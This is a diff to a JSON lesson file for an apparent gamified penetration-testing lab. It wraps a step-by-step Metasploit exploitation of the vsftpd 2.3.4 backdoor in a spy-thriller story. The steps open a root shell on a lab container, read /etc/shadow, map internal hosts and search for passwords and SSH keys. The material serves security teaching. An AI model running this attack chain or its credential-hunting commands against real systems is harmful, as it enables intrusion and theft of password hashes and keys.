@@ -7,84 +7,101 @@
   "port": 21,
   "short_description": "Exploit the famous vsftpd 2.3.4 backdoor for instant root access.",
   "description": "In 2011, an attacker inserted a backdoor into vsftpd 2.3.4's source code. When a username contains ':)' (smiley face), it opens a shell on port 6200. This is CVE-2011-2523 and one of the easiest exploits to learn with Metasploit.",
+
+  "episode_number": 1,
+  "episode_title": "THE FORGOTTEN DOOR",
+  "next_episode_id": "ssh-bruteforce",
+
+  "handler_message": "We've identified an FTP server at 172.20.0.15 that Cerberus forgot to decommission. Old infrastructure, legacy backups, project archives they thought no one would find.\n\nThe server runs vsftpd 2.3.4 - a version with a notorious backdoor. Someone compromised the source code years ago. A smiley face in the username opens a shell.\n\nCerberus never patched it. Their arrogance will be their undoing.\n\nGet inside. See what they left behind.",
+
+  "episode_intro": "It started three weeks ago. A packet capture that wasn't meant for you. A scheduling conflict on a Tor relay. Someone's encrypted traffic, briefly visible.\n\nYou shouldn't have looked. But you did.\n\nThe word NIGHTFALL appeared seventeen times. Alongside it: infrastructure targets, deployment schedules, and the name of a defense contractor you'd never heard of.\n\nCerberus Systems.\n\nSince then, your apartment was searched. Your accounts were probed. A car has been parked outside your building for six days.\n\nYou're in too deep to stop now. The only way out is through.",
+
+  "episode_outro": "The archived files paint a picture. Project schedules. Internal IP addresses. Codenames you don't recognize yet.\n\nBut one name appears repeatedly: David Chen, Senior Systems Administrator.\n\nHis employee ID is tagged on dozens of files. Recent access logs show he was downloading documents aggressively - far more than his job required.\n\nThe most recent entry is from three weeks ago. Then nothing.\n\nA quick search confirms your suspicion. David Chen hasn't been seen since. Police say he 'left voluntarily.' His family says otherwise.\n\nHe knew something. Maybe he found what you're looking for.\n\nHis home workstation might still have answers.",
+
+  "interstitial": {
+    "title": "Episode 1: THE FORGOTTEN DOOR",
+    "content": "Three weeks ago, you intercepted traffic that wasn't meant for you. Encrypted communications referencing something called NIGHTFALL.\n\nYou've been piecing it together ever since. And someone has noticed.\n\nYour apartment was searched. A car has been parked outside for days. You're running out of time.\n\nAn anonymous contact has started sending you intel. Targets. Credentials. Guidance. You don't know who they are or why they're helping.\n\nBut their first target is clear: an old FTP server that Cerberus Systems forgot to decommission.\n\nTime to see what they left behind."
+  },
+
   "steps": [
     {
       "title": "Verify the target is running",
       "command": "nmap -sV 172.20.0.15 -p 21",
-      "explanation": "This scans port 21 (FTP) and identifies the service version. Look for 'vsftpd 2.3.4'.",
+      "narrative": "Before any engagement, verify your target. Nmap's -sV flag performs service version detection - essential for identifying exploitable software. For this server, we're looking for vsftpd 2.3.4 specifically. That version contains a backdoor inserted by an unknown attacker in 2011. Cerberus never updated it.",
       "expected": "You should see: 21/tcp open ftp vsftpd 2.3.4",
       "duration": "5-10 sec"
     },
     {
       "title": "Start Metasploit",
       "command": "msfconsole -q",
-      "explanation": "The -q flag skips the banner for faster startup. Wait for the msf6 > prompt.",
+      "narrative": "Metasploit is the industry-standard exploitation framework. The -q flag suppresses the banner for faster startup. Inside, you have access to thousands of exploits, payloads, and auxiliary modules. For a backdoor this well-documented, the exploit is already written.",
       "duration": "5-15 sec"
     },
     {
       "title": "Search for the exploit",
       "command": "search vsftpd",
-      "explanation": "This searches Metasploit's database for vsftpd-related modules.",
+      "narrative": "Metasploit's search function queries its module database. The vsftpd 2.3.4 backdoor is famous enough to have its own dedicated exploit. When a username containing ':)' is sent, the server opens a shell on port 6200. No authentication required.",
       "expected": "You'll see exploit/unix/ftp/vsftpd_234_backdoor in the results",
       "duration": "1-2 sec"
     },
     {
       "title": "Load the exploit module",
       "command": "use exploit/unix/ftp/vsftpd_234_backdoor",
-      "explanation": "This loads the backdoor exploit. Your prompt changes to show the active module."
+      "narrative": "Loading a module changes your context. The prompt updates to show you're working with this specific exploit. Every module has options - parameters you configure before execution. This one is simple: just point it at the target."
     },
     {
       "title": "View module options",
       "command": "show options",
-      "explanation": "See what parameters the exploit needs. RHOSTS is the target IP.",
+      "narrative": "Always review options before running an exploit. RHOSTS (Remote Hosts) is the target IP. Some exploits need credentials, ports, or payload configurations. This backdoor is elegant in its simplicity - just an IP address.",
       "expected": "You'll see RHOSTS is required and currently empty"
     },
     {
       "title": "Set the target",
       "command": "set RHOSTS 172.20.0.15",
-      "explanation": "This tells Metasploit which host to attack."
+      "narrative": "RHOSTS accepts single IPs, ranges, or CIDR notation. Today it's one server - the forgotten FTP archive that Cerberus left exposed. Their infrastructure sprawls across networks they've lost track of. That's the gap you're walking through."
     },
     {
       "title": "Execute the exploit",
       "command": "run",
-      "explanation": "This triggers the backdoor and opens a shell session.",
+      "narrative": "Execution. Metasploit sends a malformed username containing the trigger sequence. The backdoor activates. A shell opens on port 6200. The connection is established. You're inside Cerberus infrastructure now.",
       "expected": "[*] Command shell session 1 opened",
       "duration": "2-5 sec"
     },
     {
-      "title": "Verify root access (no prompt - just type!)",
+      "title": "Verify root access",
       "command": "whoami",
-      "explanation": "IMPORTANT: There is NO prompt. The cursor is just blinking. Type 'whoami' and press Enter anyway - it works! Raw reverse shells don't show a prompt.",
+      "narrative": "Raw reverse shells don't show prompts - the cursor just blinks. Don't let that fool you into thinking nothing happened. Type 'whoami' and press Enter. The backdoor runs as root. Full system access from a smiley face.",
       "expected": "root"
     },
     {
       "title": "Upgrade to a real prompt",
       "command": "/bin/bash -i",
-      "explanation": "Raw reverse shells have no prompt. This spawns an interactive bash so you get a familiar root@container:/# prompt.",
+      "narrative": "Raw shells are functional but uncomfortable - no prompt, no tab completion, Ctrl+C kills your session. Spawning an interactive bash gives you a proper terminal. Small improvement that makes exploration much easier.",
       "expected": "root@<container>:/# prompt appears"
     },
     {
       "title": "Confirm full access",
       "command": "id && cat /etc/shadow | head -3",
-      "explanation": "Confirm you're root (uid=0) and can read sensitive files like /etc/shadow.",
+      "narrative": "Two verification commands chained together. 'id' confirms you're uid 0 (root). /etc/shadow contains password hashes - only readable by root. If you can see this file, you have complete control. The system is yours.",
       "expected": "uid=0(root) and shadow file contents"
     },
     {
       "title": "Explore the network",
       "command": "cat /etc/hosts",
-      "explanation": "Docker adds container hostnames here. These are potential pivot targets."
+      "narrative": "The hosts file often reveals internal network structure. Docker environments add container hostnames here. Each entry is a potential pivot point - another system in the Cerberus infrastructure. Another piece of NIGHTFALL.",
+      "expected": "List of internal hostnames and IPs"
     },
     {
-      "title": "One-command pwn (after you learn it)",
+      "title": "One-command pwn",
       "command": "pwn vsftpd",
-      "explanation": "Exit the shell (type 'exit' twice) and try this. Now that you understand the attack, this script runs it automatically."
+      "narrative": "Now that you understand the attack chain, automation is appropriate. Exit your shell (type 'exit' twice) and run 'pwn vsftpd' from Kali. Same result, faster execution. But always understand what's happening under the hood before you automate."
     }
   ],
   "pwn_command": "pwn vsftpd",
-  "success_criteria": "You have a root shell with a proper prompt (root@...:#) and can explore the compromised system.",
+  "success_criteria": "You have a root shell on the Cerberus archive server. You can explore legacy files and discover what they tried to hide.",
   "next_steps": [
-    "Run 'env' to find secrets in environment variables",
-    "Check for SSH keys: ls -la /root/.ssh/",
-    "Try pivoting: ping 172.20.0.10 (DVWA)"
+    "Search for documents: find / -name '*.pdf' 2>/dev/null",
+    "Look for credentials: grep -r 'password' /home/",
+    "Check for SSH keys: ls -la /root/.ssh/"
   ]
 }
